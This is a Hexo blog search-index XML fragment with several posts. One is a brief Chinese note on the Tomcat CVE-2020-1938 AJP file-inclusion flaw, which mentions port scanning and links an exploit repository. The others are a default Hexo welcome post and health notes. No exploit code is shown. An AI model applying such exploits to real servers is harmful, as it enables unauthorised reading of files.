    
    <entry>
      <title>Hello World</title>
      <link href="/2024/11/13/hello-world/"/>
      <url>/2024/11/13/hello-world/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Web中间件-Tomcat9-CVE-2020-1938</title>
      <link href="/2024/09/27/CVE-2020-1938/"/>
      <url>/2024/09/27/CVE-2020-1938/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p><a href="/../assets/img/image-111.png" title=" " class="gallery-item"><img src="/../assets/img/image-111.png" alt=" "></a></p><p>端口扫描<br><a href="/../assets/img/image-112.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-112.png" alt="alt text"></a></p><p>tomcat默认的conf&#x2F;server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另外一个就是默认的8009 AJP协议端口，两个端口默认均监听在外网ip。</p><p><a href="https://github.com/leonooo13/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/leonooo13/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p><p><a href="/../assets/img/image-114.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-114.png" alt="alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tomcat </tag>
            
            <tag> 应用中间件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>健康运动</title>
      <link href="/2024/03/16/2024-03-16-bit-sports/"/>
      <url>/2024/03/16/2024-03-16-bit-sports/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="健康运动"><a href="#健康运动" class="headerlink" title="健康运动"></a>健康运动</h1><h2 id="todo-x-完成1km-x-拉伸运动完成-x"><a href="#todo-x-完成1km-x-拉伸运动完成-x" class="headerlink" title="todo- [x] 完成1km- [x] 拉伸运动完成- [x] "></a>todo<br>- [x] 完成1km<br>- [x] 拉伸运动完成<br>- [x] </h2><ul><li><input checked="" disabled="" type="checkbox"> 如何进行快速搜索</li></ul></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Health </category>
          
          <category> life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Health </tag>
            
            <tag> life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Keep Healthy and Optimisic</title>
      <link href="/2024/03/14/2024-03-14-keep-healthy-and-optimisic/"/>
      <url>/2024/03/14/2024-03-14-keep-healthy-and-optimisic/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="Keep-Healthy-and-Optimisic"><a href="#Keep-Healthy-and-Optimisic" class="headerlink" title="Keep Healthy and Optimisic"></a>Keep Healthy and Optimisic</h1><p>how to keep healthy and optimisic</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. Keep a good mood</span><br><span class="line">2. Keep a good diet</span><br><span class="line">3. Keep a good sleep</span><br><span class="line">4. Keep a good exercise</span><br><span class="line">5. Keep a good work</span><br><span class="line">6. Keep a good relationship</span><br><span class="line">7. Keep a good hobby</span><br><span class="line">8. Keep a good learning</span><br><span class="line">9. Keep a good thinking</span><br><span class="line">10. Keep a good life</span><br></pre></td></tr></table></figure><p>body and mind are the most important things in our life, so we should keep them healthy and optimisic.</p><h3 id="wlb"><a href="#wlb" class="headerlink" title="wlb"></a>wlb</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">work-life balance</span><br></pre></td></tr></table></figure><h3 id="how-to-go-out-of-the-shadow"><a href="#how-to-go-out-of-the-shadow" class="headerlink" title="how to go out of the shadow"></a>how to go out of the shadow</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. reduce the pressure</span><br><span class="line">2. keep a good mood</span><br><span class="line">3. keep a good relationship</span><br><span class="line">4. keep a good hobby</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Body </category>
          
          <category> Health </category>
          
      </categories>
      
      
        <tags>
            
            <tag> health </tag>
            
            <tag> optimisic </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
